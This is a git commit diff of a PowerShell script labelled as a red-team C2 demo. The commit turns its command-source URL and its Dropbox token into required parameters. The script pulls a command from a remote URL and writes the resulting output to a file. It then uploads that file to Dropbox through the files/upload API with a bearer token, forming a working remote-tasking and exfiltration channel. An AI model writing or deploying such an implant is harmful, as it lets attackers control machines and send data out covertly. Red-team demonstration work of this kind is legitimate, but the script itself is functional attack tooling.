f9f7f2ccb32e0e8ace55839765f8f82077c0f85e
roccosicilia <rocco.sicilia@protonmail.com>
2023-01-12 15:09:06 +0100

    NOP

--- RedTeam/C2demo/invoke-demo.ps1
+++ RedTeam/C2demo/invoke-demo.ps1
@@ -1,8 +1,13 @@
 
-$BASEDIR = pwd
-$C2GB_token = ''
+Param(
+    [Parameter(Mandatory=$true)]
+    [string]$C2GB_token,
+    [Parameter(Mandatory=$true)]
+    [string]$cmd_source
+)
 
-$cmd = Invoke-webrequest -URI "https://raw.githubusercontent.com/roccosicilia/sToolz/master/RedTeam/C2demo/input.txt"
+$BASEDIR = pwd
+$cmd = Invoke-webrequest -URI "$cmd_source"
 Write-Host "Test del comando" + $cmd
 
 if ( "$cmd" -eq 'NOP')
@@ -15,17 +20,15 @@ else
     Write-Host $content
     $content | Out-File -FilePath "$BASEDIR\psoutput.txt"
 
-    # set arg to send file
+    # set args
     $TargetFilePath = '/psoutput.txt'
-
-
     $args = '{ "path": "' + $TargetFilePath + '", "mode": "add", "autorename": true, "mute": false }'
     $auth = "Bearer " + $C2GB_token
-
     $headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
     $headers.Add("Authorization", $auth)
     $headers.Add("Dropbox-API-Arg", $args)
     $headers.Add("Content-Type", 'application/octet-stream')
 
+    # send file
     Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile .\psoutput.txt -Headers $headers
 }
